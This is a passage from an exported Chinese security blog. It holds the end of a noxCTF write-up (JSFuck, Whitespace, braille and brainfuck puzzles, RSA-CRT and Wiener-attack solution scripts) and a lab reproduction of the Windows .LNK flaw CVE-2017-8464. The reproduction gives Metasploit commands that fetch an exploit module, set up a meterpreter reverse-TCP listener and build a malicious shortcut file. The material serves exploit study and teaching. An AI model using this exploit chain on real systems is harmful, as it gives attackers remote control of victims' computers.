+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+([][[]]+[])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])() 这不就是jsfuck吗，放到http://codertab.com/JsUnFuck跑一下，结果输出`nope`,事情远远没有想象的那么简单。经过仔细查看这些“空白”，发现不仅仅是空白，有很多空格，制表符之类的，Google查下，叫做Whitespace程序，[Whitespace](https://zh.wikipedia.org/wiki/Whitespace)是种深奥的编程语言。 这个网站可以在线解密, 最后flag：noxCTF{DaFuckIsWHITESPACE} Blind Date题目1My mom got me a date with someone! she sent me an image but i cannot open it. I don&apos;t want it to be a blind date. Can you help me? 这真的是个脑洞题！下载一个图片，又是打不开的文件，查看下格式 跟正常文件比下 确实不一样哦！写个脚本试试恢复看看12345678f = open('BlindDate.jpeg', \"rb\")s = f.read()f.close()data = ''for i in range(0,len(s),4): data += s[i:i+4][::-1]file = open('blind.jpeg','wb')file.write(data) 得到这样一个沙雕图片 按照套路，binwalk跑一下 有个zip文件，分离下，得到压缩文件，可是。。要密码，这要我去哪里找密码啊？ 再次看看那个盲人图片，strings分析之后得到一些奇怪的东西Li4gICAuICAuLiAgLi4gICAuICAuLiAgLi4gICAuICAuLiAgLiAgLi4NCi4gICAgLiAgIC4gICAgICAgLiAgICAgIC4gICAgLiAgIC4gIC4gIA0KICAgIC4uICAgICAgICAgIC4uICAgICAgLiAgIC4uICAgICAgLiAgLgPK 尝试base64解密之后有得到这些奇怪的东西123.. . .. .. . .. .. . .. . ... . . . . . . . .. .. . .. . . 摩尔斯？不像。那是啥？莫非是盲文！！盲文解密之后为F4C3P4LM，试下解密zip，打开了！！高兴。又得到下面的东西。 1++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++.+.+++++++++.&lt;---.+++++++++++++++++.--------------.&gt;+++.&lt;+++++++++++++++++.&lt;++++++++++++++++++.&gt;&gt;------.---------.--------.-----.++++++++++++++++++++++++++.&lt;&lt;.&gt;&gt;----.&lt;++++++++.+++.&gt;---------.&lt;&lt;+.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.&gt;-----.&lt;+.&gt;.+++.&gt;--------.&lt;&lt;---.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.++++++++++++.&gt;&gt;+++++++++.&lt;&lt;&lt;++++++++++++++++++++++. 这个我知道是brainfuck，拿到网站上面解密下. flag:noxCTF{W0uld_y0u_bl1nd_d4t3_4_bl1nd_d4t3?} Chop Suey题目1234567891011Today I ate in a Chinese restaurant and got myself a fortune cookie. These things usually contain a note with a nice sentence or phrase, but mine had numbers in it instead! Can you help me find the meaning of the numbers?p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 这个考的是中国剩余定理,参考这篇文章，https://www.rootnetsec.com/picoctf-weird-rsa/ 12345678910111213141516171819from crypto_commons.rsa.rsa_commons import modinv, rsa_printableimport gmpy2p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852qinv = modinv(q, p)m1 = pow(c, dp, p)m2 = pow(c, dq, q)h = (qinv * (m1 - m2)) % pm = m2 + h * qstr=hex(m)str=str[2:]print ''.join([chr(int(''.join(c), 16)) for c in zip(str[0::2],str[1::2])]) https://github.com/p4-team/crypto-commons下载这个库，sudo python setup.py install安装下。 flag:noxCTF{W31c0m3_70_Ch1n470wn} WTF题目1234567Um uhhhhhhhhh WTF IS THIS?! I give up. Now you try to solve this.N = lObAbAbSBlZOOEBllOEbblTlOAbOlTSBATZBbOSAEZTZEAlSOggTggbTlEgBOgSllEEOEZZOSSAOlBlAgBBBBbbOOSSTOTEOllbZgElgbZSZbbSTTOEBZZSBBEEBTgESEgAAAlAOAEbTZBZZlOZSOgBAOBgOAZEZbOBZbETEOSBZSSElSSZlbBSgbTBOTBSBBSOZOAEBEBZEZASbOgZBblbblTSbBTObAElTSTOlSTlATESEEbSTBOlBlZOlAOETAZAgTBTSAEbETZOlElBEESObbTOOlgAZbbOTBOBEgAOBAbZBObBTge = lBlbSbTASTTSZTEASTTEBOOAEbEbOOOSBAgABTbZgSBAZAbBlBBEAZlBlEbSSSETAlSOlAgAOTbETAOTSZAZBSbOlOOZlZTETAOSSSlTZOElOOABSZBbZTSAZSlASTZlBBEbEbOEbSTAZAZgAgTlOTSEBEAlObEbbgZBlgOEBTBbbSZAZBBSSZBOTlTEAgBBSZETAbBgEBTATgOZBTllOOSSTlSSTOSSZSZAgSZATgbSOEOTgTTOAABSZEZBEAZBOOTTBSgSZTZbOTgZTTElSOATOAlbBZTBlOTgOSlETgTBOglgETbTc = SOSBOEbgOZTZBEgZAOSTTSObbbbTOObETTbBAlOSBbABggTOBSObZBbbggggZZlbBblgEABlATBESZgASBbOZbASbAAOZSSgbAOZlEgTAlgblBTbBSTAEBgEOEbgSZgSlgBlBSZOObSlgAOSbbOOgEbllAAZgBATgEAZbBEBOAAbZTggbOEZSSBOOBZZbAAlTBgBOglTSSESOTbbSlTAZATEOZbgbgOBZBBBBTBTOSBgEZlOBTBSbgbTlZBbbOBbTSbBASBTlglSEAEgTOSOblAbEgBAbOlbOETAEZblSlEllgTTbbgb 看见e的这么大的值，它可能是Wiener攻击或变体，但是用一种不知道是什么的编码进行了加密，仔细看看这个e的值，我们发现他有一个特点: [&#39;A&#39;, &#39;b&#39;, &#39;E&#39;, &#39;g&#39;, &#39;l&#39;, &#39;O&#39;, &#39;S&#39;, &#39;B&#39;, &#39;T&#39;, &#39;Z&#39;] 只有这十个字符组成，于是有了个大胆的想法12345678910&apos;O&apos; --&gt; 0&apos;l&apos; --&gt; 1&apos;Z&apos; --&gt; 2&apos;E&apos; --&gt; 3&apos;A&apos; --&gt; 4&apos;S&apos; --&gt; 5&apos;b&apos; --&gt; 6&apos;T&apos; --&gt; 7&apos;B&apos; --&gt; 8&apos;g&apos; --&gt; 9 将e解密 123456789101112131415def jiemi(str1): for i in str1: if i not in \"AbEglOSBTZ\": print i str1 = str1.replace(\"O\", '0') str1 = str1.replace(\"l\", '1') str1 = str1.replace(\"Z\", '2') str1 = str1.replace(\"E\", '3') str1 = str1.replace(\"A\", '4') str1 = str1.replace(\"S\", '5') str1 = str1.replace(\"b\", '6') str1 = str1.replace(\"T\", '7') str1 = str1.replace(\"B\", '8') str1 = str1.replace(\"g\", '9') return str1 得到e=18165674577527345773800436360005849487629584246818834218136555374150149407637407524285601002127374055517203100485286275425145721883636036574242949710753834106366928190387866524288552807173498852374689387479028711005571557055252495247965030797704485232834280077859527260792773150470416827810790513797809193767 再利用winner attack攻击 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#!/usr/bin/env python3import gmpy2from Crypto.Util.number import *n = 'lObAbAbSBlZOOEBllOEbblTlOAbOlTSBATZBbOSAEZTZEAlSOggTggbTlEgBOgSllEEOEZZOSSAOlBlAgBBBBbbOOSSTOTEOllbZgElgbZSZbbSTTOEBZZSBBEEBTgESEgAAAlAOAEbTZBZZlOZSOgBAOBgOAZEZbOBZbETEOSBZSSElSSZlbBSgbTBOTBSBBSOZOAEBEBZEZASbOgZBblbblTSbBTObAElTSTOlSTlATESEEbSTBOlBlZOlAOETAZAgTBTSAEbETZOlElBEESObbTOOlgAZbbOTBOBEgAOBAbZBObBTg'e = 'lBlbSbTASTTSZTEASTTEBOOAEbEbOOOSBAgABTbZgSBAZAbBlBBEAZlBlEbSSSETAlSOlAgAOTbETAOTSZAZBSbOlOOZlZTETAOSSSlTZOElOOABSZBbZTSAZSlASTZlBBEbEbOEbSTAZAZgAgTlOTSEBEAlObEbbgZBlgOEBTBbbSZAZBBSSZBOTlTEAgBBSZETAbBgEBTATgOZBTllOOSSTlSSTOSSZSZAgSZATgbSOEOTgTTOAABSZEZBEAZBOOTTBSgSZTZbOTgZTTElSOATOAlbBZTBlOTgOSlETgTBOglgETbT'c = 'SOSBOEbgOZTZBEgZAOSTTSObbbbTOObETTbBAlOSBbABggTOBSObZBbbggggZZlbBblgEABlATBESZgASBbOZbASbAAOZSSgbAOZlEgTAlgblBTbBSTAEBgEOEbgSZgSlgBlBSZOObSlgAOSbbOOgEbllAAZgBATgEAZbBEBOAAbZTggbOEZSSBOOBZZbAAlTBgBOglTSSESOTbbSlTAZATEOZbgbgOBZBBBBTBTOSBgEZlOBTBSbgbTlZBbbOBbTSbBASBTlglSEAEgTOSOblAbEgBAbOlbOETAEZblSlEllgTTbbgb'lookup = ['O', 'l', 'Z', 'E', 'A', 'S', 'b', 'T', 'B', 'g']def decode(x): ans = '' for c in x: ans += str(lookup.index(c)) return int(ans)n = decode(n)e = decode(e)c = decode(c)def cf_expansion(n, d): e = [] q = n // d r = n % d e.append(q) while r != 0: n, d = d, r q = n // d r = n % d e.append(q) return edef convergents(e): n = [] # Nominators d = [] # Denominators for i in range(len(e)): if i == 0: ni = e[i] di = 1 elif i == 1: ni = e[i]*e[i-1] + 1 di = e[i] else: # i &gt; 1 ni = e[i]*n[i-1] + n[i-2] di = e[i]*d[i-1] + d[i-2] n.append(ni) d.append(di) yield (ni, di)def solve(b, c): k = b * b - 4 * 1 * c if k &lt; 0: return [] sk, complete = gmpy2.iroot(k, 2) if not complete: return [] return [int((-b + sk) // 2), int((-b - sk) // 2)]def wiener(e, n): kd = convergents(cf_expansion(e, n)) for i, (k, d) in enumerate(kd): if k == 0: continue phi = (e * d - 1) // k roots = solve(phi - n - 1, n) if len(roots) == 2: p, q = roots if p * q == n: return (p, q)p, q = wiener(e, n)r = (p - 1) * (q - 1)d = inverse(e, r)m = pow(c, d, n)print(long_to_bytes(m)) flag:noxCTF{RSA_1337_10rd} 首发于ichunqiuhttps://bbs.ichunqiu.com/thread-45809-1-1.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://threst.github.io/tags/ctf/"}]},{"title":"CVE-2017-8464漏洞复现","slug":"CVE-2017-8464漏洞复现","date":"2018-09-11T07:28:14.000Z","updated":"2018-09-11T07:28:55.696Z","comments":true,"path":"2018/09/11/CVE-2017-8464漏洞复现/","link":"","permalink":"https://threst.github.io/2018/09/11/CVE-2017-8464漏洞复现/","excerpt":"","text":"漏洞描述2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。 当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。注释:.LNK是windows系统内应用程序快捷方式文件的文件类型后缀名。漏洞利用条件和方式:远程利用 漏洞影响范围:Microsoft Windows 10 Version 1607 for 32-bit SystemsMicrosoft Windows 10 Version 1607 for x64-based SystemsMicrosoft Windows 10 for 32-bit SystemsMicrosoft Windows 10 for x64-based SystemsMicrosoft Windows 10 version 1511 for 32-bit SystemsMicrosoft Windows 10 version 1511 for x64-based SystemsMicrosoft Windows 10 version 1703 for 32-bit SystemsMicrosoft Windows 10 version 1703 for x64-based SystemsMicrosoft Windows 7 for 32-bit Systems SP1Microsoft Windows 7 for x64-based Systems SP1Microsoft Windows 8.1 for 32-bit SystemsMicrosoft Windows 8.1 for x64-based SystemsMicrosoft Windows RT 8.1 win7x64本地复现kalix64 192.168.1.101 攻击机windows7x64 192.168.1.111 目标靶机 0x000下载msf脚本1234cd /usr/share/metasploit-framework/modules/exploits/windows/fileformat/wget https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb 0x01生成监听shell1234msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; set LHOST 192.168.1.101msf exploit(handler) &gt; exploit -j 0x02生成.LNK文件1234567msf exploit(multi/handler) &gt; backmsf &gt; use exploits/windows/fileformat/cve_2017_8464_lnk_rcemsf exploit(windows/fileformat/cve_2017_8464_lnk_rce) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpPAYLOAD =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(windows/fileformat/cve_2017_8464_lnk_rce) &gt; set LHOST 192.168.1.101LHOST =&gt; 192.168.1.101msf exploit(windows/fileformat/cve_2017_8464_lnk_rce) &gt; exploit 0x03复制到win7运行 0x04最后 sessions -i 1 